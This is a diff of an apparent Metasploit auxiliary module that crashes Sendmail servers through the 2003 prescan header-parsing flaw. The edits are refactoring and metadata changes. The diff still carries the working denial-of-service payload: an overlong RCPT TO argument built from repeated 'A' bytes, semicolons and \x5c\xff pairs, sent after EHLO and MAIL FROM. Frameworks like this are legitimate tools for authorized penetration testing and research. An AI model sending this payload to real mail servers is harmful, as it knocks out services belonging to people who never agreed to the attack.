@@ -1,13 +1,9 @@
 ##
-# This module requires Metasploit: http://metasploit.com/download
+# This module requires Metasploit: https://metasploit.com/download
 # Current source: https://github.com/rapid7/metasploit-framework
 ##
 
-
-require 'msf/core'
-
-class Metasploit3 < Msf::Auxiliary
-
+class MetasploitModule < Msf::Auxiliary
   include Msf::Exploit::Remote::Smtp
   include Msf::Auxiliary::Dos
 
@@ -20,7 +16,7 @@ class Metasploit3 < Msf::Auxiliary
         parsing SMTP headers. Due to the prescan function, only 0x5c and 0x00
         bytes can be used, limiting the likelihood for arbitrary code execution.
       },
-      'Author'         => [ 'patrick' ],
+      'Author'         => [ 'aushack' ],
       'References'     =>
         [
           [ 'OSVDB', '2577' ],
@@ -28,7 +24,7 @@ class Metasploit3 < Msf::Auxiliary
           [ 'BID', '8641' ],
           [ 'EDB', '24' ]
         ],
-      'DisclosureDate' => 'Sep 17 2003'))
+      'DisclosureDate' => '2003-09-17'))
   end
 
   def run
@@ -42,10 +38,10 @@ class Metasploit3 < Msf::Auxiliary
 
       sploit = ("A" * 255 + ";") * 4 + "A" * 217 + ";" + "\x5c\xff" * 28
 
-      raw_send_recv("EHLO X\r\n")
-      raw_send_recv("MAIL FROM: #{datastore['MAILFROM']}\r\n")
+      smtp_send_recv("EHLO X\r\n")
+      smtp_send_recv("MAIL FROM: #{datastore['MAILFROM']}\r\n")
       print_status("Sending DoS packet.")
-      raw_send_recv("RCPT TO: #{sploit}\r\n")
+      smtp_send_recv("RCPT TO: #{sploit}\r\n")
 
       disconnect
     rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout
@@ -55,7 +51,6 @@ class Metasploit3 < Msf::Auxiliary
     end
 
   end
-
 end
 
 =begin
